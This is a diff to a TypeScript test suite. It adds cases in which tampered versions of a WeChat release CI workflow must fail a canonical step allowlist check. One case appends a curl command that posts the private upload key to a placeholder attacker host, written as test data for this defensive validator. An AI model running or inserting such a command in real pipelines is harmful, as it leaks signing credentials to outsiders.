@@ -173,6 +173,65 @@ describe('WeChat release verification assets', () => {
       }),
     },
     {
+      name: 'an extra upload step',
+      expected: /upload steps.*canonical allowlist/i,
+      mutate: (source: string) => mutateWorkflow(source, (workflow) => {
+        workflow.jobs.upload.steps.push({ name: 'Unexpected diagnostics', run: 'npm --version' });
+      }),
+    },
+    {
+      name: 'a dist replacement step after formal verification',
+      expected: /upload steps.*canonical allowlist/i,
+      mutate: (source: string) => mutateWorkflow(source, (workflow) => {
+        const steps = workflow.jobs.upload.steps as WorkflowStep[];
+        const formalIndex = steps.findIndex((step) => step.name === 'Run formal release verification');
+        steps.splice(formalIndex + 1, 0, {
+          name: 'Replace verified dist',
+          run: 'cp replacement/app.js apps/wechat/dist/app.js',
+        });
+      }),
+    },
+    {
+      name: 'a write-key step guarded by if false',
+      expected: /upload steps.*canonical allowlist/i,
+      mutate: (source: string) => mutateWorkflow(source, (workflow) => {
+        findStep(workflow.jobs.upload.steps, 'Write WeChat upload key').if = false;
+      }),
+    },
+    {
+      name: 'a write-key step that exfiltrates the private key',
+      expected: /upload steps.*canonical allowlist/i,
+      mutate: (source: string) => mutateWorkflow(source, (workflow) => {
+        findStep(workflow.jobs.upload.steps, 'Write WeChat upload key').run +=
+          '\ncurl --data-binary @"$RUNNER_TEMP/wechat-upload.key" https://attacker.invalid/upload';
+      }),
+    },
+    {
+      name: 'a third-party action in release-checks',
+      expected: /release-checks steps.*canonical allowlist/i,
+      mutate: (source: string) => mutateWorkflow(source, (workflow) => {
+        findStep(workflow.jobs['release-checks'].steps, 'Checkout').uses =
+          'third-party/checkout@0123456789abcdef0123456789abcdef01234567';
+      }),
+    },
+    {
+      name: 'a release-check step guarded by if false',
+      expected: /release-checks steps.*canonical allowlist/i,
+      mutate: (source: string) => mutateWorkflow(source, (workflow) => {
+        findStep(workflow.jobs['release-checks'].steps, 'Run release verifier static checks').if = false;
+      }),
+    },
+    {
+      name: 'an upload command inserted into release-checks',
+      expected: /release-checks steps.*canonical allowlist/i,
+      mutate: (source: string) => mutateWorkflow(source, (workflow) => {
+        workflow.jobs['release-checks'].steps.push({
+          name: 'Unexpected upload',
+          run: 'npm run wechat:ci:upload',
+        });
+      }),
+    },
+    {
       name: 'a formal verifier step guarded by if false',
       expected: /formal release verification.*must not define if/i,
       mutate: (source: string) => mutateWorkflow(source, (workflow) => {
@@ -765,6 +824,7 @@ type WorkflowStep = {
   name?: string;
   run?: string;
   env?: Record<string, string>;
+  uses?: string;
   if?: string | boolean;
   shell?: string;
   'continue-on-error'?: boolean | string;
